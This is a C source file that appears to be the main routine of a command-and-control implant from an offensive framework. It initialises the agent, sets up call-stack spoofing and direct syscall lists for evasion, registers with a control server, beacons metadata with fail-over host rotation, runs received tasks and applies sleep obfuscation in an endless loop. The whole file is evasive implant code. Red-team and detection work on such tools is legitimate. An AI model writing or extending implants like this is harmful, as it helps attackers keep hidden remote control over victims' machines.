#include "../../headers/agent/agent.h"
#include "../../headers/package/package.h"
#include "../../headers/TaskController/TaskController.h"
#include "../../headers/helpers/ListManager.h"
#include "../../headers/agent/evasion/SleepObfu/SleepObfMain.h"
#include "../../headers/agent/evasion/syscalls/syscalls.h"


#ifdef _MSC_VER
// MSVC compiler
#define GET_ADDRESS_OF_RETURN_ADDRESS() _AddressOfReturnAddress()
#else
// Other compilers (e.g., GCC, Clang)
#define GET_ADDRESS_OF_RETURN_ADDRESS() ((void**)__builtin_frame_address(0)+1)
#endif


pAgent agent = NULL;

void AgentMain(PVOID RetAddr) {

	INT err;
	Agent Agent = { 0 };
	agent = &Agent;

	if ((err = init_agent()) != 0) {
		printf("[error] attempting to initialize agent\n");
	}

	agent->Walker->RetAddr = GET_ADDRESS_OF_RETURN_ADDRESS();

	PopulateBenignSyscallList();
	PopulateSyscallList();

	if ((err = RegisterAgent()) != 0) {
		printf("[error] attempting to register agent\n");
	}

	AgentRoutine();

}

void AgentRoutine() {
	while (TRUE) {
		if (!agent->session->Active)
		{
			if ((PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL)) != PACKAGE_SUCCESS) {
				printf("[error] attempting to send package\n");
				agent->config->listenerConfig->CurrentHost->NumFailures++;
				if (agent->config->listenerConfig->CurrentHost->NumFailures >= MAX_HOST_FAILURES)
				{
					agent->config->listenerConfig->CurrentHost->NumFailures = 0;
					SelectHost(HOST_ROTATION_FAIL_OVER);
				}
			}
			agent->config->listenerConfig->CurrentHost->NumFailures = 0;
		}

		if (agent->session->Active) {
			TaskingRoutine();
		}

		PerformSleepObf();
	}
}